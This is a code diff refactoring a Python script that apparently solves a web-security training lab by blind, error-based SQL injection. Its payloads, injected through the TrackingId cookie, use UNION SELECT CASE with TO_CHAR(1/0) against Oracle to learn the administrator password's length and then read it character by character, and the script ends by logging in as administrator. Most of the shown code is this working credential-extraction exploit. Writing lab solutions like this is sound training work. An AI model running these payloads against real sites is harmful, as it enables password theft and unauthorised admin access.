@@ -1,14 +1,10 @@
 from ...utils import *
-from bs4 import BeautifulSoup
-from urllib.parse import urljoin
-
-import requests
 import string
 
 
-def solve_lab(url, proxies):
+def solve_lab(session):
     print_info(
-        f'Determining the length of the administrator password by visiting "{url}" with the following cookies:'
+        f'Determining the length of the administrator password by visiting "/" with the following cookies:'
     )
     print(
         '{"TrackingId": "\' UNION SELECT CASE WHEN (LENGTH((SELECT password FROM users WHERE username=\'administrator\'))=\033[1;93m?\033[00m) THEN TO_CHAR(1/0) ELSE NULL END FROM dual --"}'
@@ -19,7 +15,7 @@ def solve_lab(url, proxies):
         cookies = {
             "TrackingId": f"' UNION SELECT CASE WHEN (LENGTH((SELECT password FROM users WHERE username='administrator'))={len_pass}) THEN TO_CHAR(1/0) ELSE NULL END FROM dual --"
         }
-        resp = requests.get(url, proxies=proxies, verify=False, cookies=cookies)
+        resp = session.get_path("/", cookies=cookies)
 
         if resp.status_code == 200:
             print_info_secondary(f"{len_pass} => 200", end="")
@@ -29,7 +25,7 @@ def solve_lab(url, proxies):
             break
 
     print_info(
-        f'Determining administrator password by visting "{url}" with the following cookies:'
+        f'Determining administrator password by visting "/" with the following cookies:'
     )
     print(
         '{"TrackingId": "\' UNION SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username=\'administrator\'), \033[1;93m?\033[00m, 1)=\033[1;93m?\033[00m) THEN TO_CHAR(1/0) ELSE NULL END FROM dual --"}'
@@ -42,7 +38,7 @@ def solve_lab(url, proxies):
             cookies = {
                 "TrackingId": f"' UNION SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='administrator'), {i+1}, 1)='{c}') THEN TO_CHAR(1/0) ELSE NULL END FROM dual --"
             }
-            resp = requests.get(url, proxies=proxies, verify=False, cookies=cookies)
+            resp = session.get_path("/", cookies=cookies)
 
             if resp.status_code == 200:
                 print_info_secondary(
@@ -62,28 +58,4 @@ def solve_lab(url, proxies):
     print()
     print_success(f"Successfully extracted administrator password: {password}\n")
 
-    url = urljoin(url, "/login")
-    print_info(f'Grabbing CSRF value from "{url}"...')
-
-    s = requests.session()
-    resp = s.get(url, proxies=proxies, verify=False)
-    soup = BeautifulSoup(resp.text, "html.parser")
-    csrf = soup.select_one('input[name="csrf"]').get("value")
-
-    if csrf is None:
-        print_fail("Unable to grab CSRF value.")
-
-    else:
-        print_success(f"CSRF value: {csrf}\n")
-
-    data = {"csrf": csrf, "username": "administrator", "password": password}
-    print_info("Logging in with the following values:")
-    print(data)
-
-    resp = s.post(
-        url,
-        proxies=proxies,
-        verify=False,
-        data=data,
-    )
-    print_success("SQL injection attack performed.\n")
+    session.login("administrator", password)
